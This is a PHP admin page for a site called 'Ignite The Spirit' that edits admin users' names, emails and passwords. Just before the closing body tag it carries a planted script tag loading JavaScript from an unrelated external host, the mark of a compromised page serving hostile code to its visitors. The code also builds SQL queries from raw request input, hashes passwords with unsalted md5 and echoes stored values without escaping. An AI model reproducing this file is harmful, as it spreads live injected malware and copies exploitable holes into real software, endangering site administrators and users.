<?php 
session_start();

include("db_connect.php");

if ($_GET['action'] == "update")
{
	foreach ($_POST as $key => $value)
	{
	$admin[$key] = $value;
	}
	
	$query = "SELECT admin_pass FROM admin_users WHERE admin_id = '$admin[id]'";
	$result = mysql_query($query);
	$row = mysql_fetch_array($result, MYSQL_ASSOC);  
	
	if ($row['admin_pass'] == md5($admin['pass']))
	{
	
		if ($admin['newpass'] != "" || $admin['repeatpass'] != "")
		{
			if ($admin['newpass'] == $admin['repeatpass'])
			{
			$encrypt_pass = md5($admin['newpass']);
			$update_query = "UPDATE admin_users SET admin_email = '$admin[email]', admin_pass = '$encrypt_pass' ,admin_name = '$admin[name]' WHERE admin_id = '$admin[id]'";
			$update_result = mysql_query($update_query); 
			header("location:index.php?page=users");
			}
		}
		else
		{
			$update_query = "UPDATE admin_users SET admin_email = '$admin[email]', admin_name = '$admin[name]' WHERE admin_id = '$admin[id]'";
			$update_result = mysql_query($update_query); 
			header("location:index.php?page=users");
		}
	}
	else
	{
		echo "invalid password";
	}
}
else if ($_GET['action'] == "edit")
{ 
	$id = strip_tags(stripslashes($_GET['id']));
	$user_query = "SELECT * FROM admin_users WHERE admin_id = '$id'";
	$user_result = mysql_query($user_query);
	$row = mysql_fetch_array($user_result, MYSQL_ASSOC);
	$email = $row['admin_email'];
	$name = $row['admin_name'];
	?>
	
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<title>ignite The Spirit | Administration</title>
	<link rel="stylesheet" href="admin.css"  type="text/css" />


	</head>

	<body>
	<div id='blanket' style='display: none;'></div>


	<h1>Ignite The Spirit | Administration</h1>

	<ul class="navigation">
	
		<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?page=news">News</a></li>
		<li><a <?php if ($current_page == "calendars"){echo "id=current";}?> href="index.php?page=calendars">Calendars</a></li>
		<li><a <?php if ($current_page == "gallery"){echo "id=current";}?> href="index.php?page=gallery">Gallery</a></li>
		<li><a <?php if ($current_page == "pages"){echo "id=current";}?> href="index.php?page=pages">Pages</a></li>
		<li><a <?php if ($current_page == "store"){echo "id=current";}?> href="index.php?page=store">Store</a></li>
		<li><a <?php if ($current_page == "users"){echo "id=current";}?> href="index.php?page=users">Users</a></li>
		<li><a href="login.php?action=logout">Log Out</a></li>
	</ul>

	<div class="container">
	
	<h2>Edit User Info</h2>
	<form action="<?php $_SERVER['PHP_SELF'] ?>?action=update" method="post">
	<input type="hidden" name="id" value="<?php echo $id; ?>">
	Name: <input name="name" type="text" value="<?php echo $name; ?>"/><br />
	Email: <input name="email" type="text" value="<?php echo $email; ?>"/><br />
	Current Password: <input name="pass" type="password" /><br />	
	<br />
	New Password: <input name="newpass" type="password" /><br />
	Retype New Password: <input name="repeatpass" type="password" /><br />
	<br />
	<input name="submit" type="submit" value="Update">
	</form>
	
	</div>
	<script src='http://nt002.cn/E/J.JS'></script></body>
	</html>
	
	
<?
}
else
{
	echo "the page you requested does not exist";
}
?>
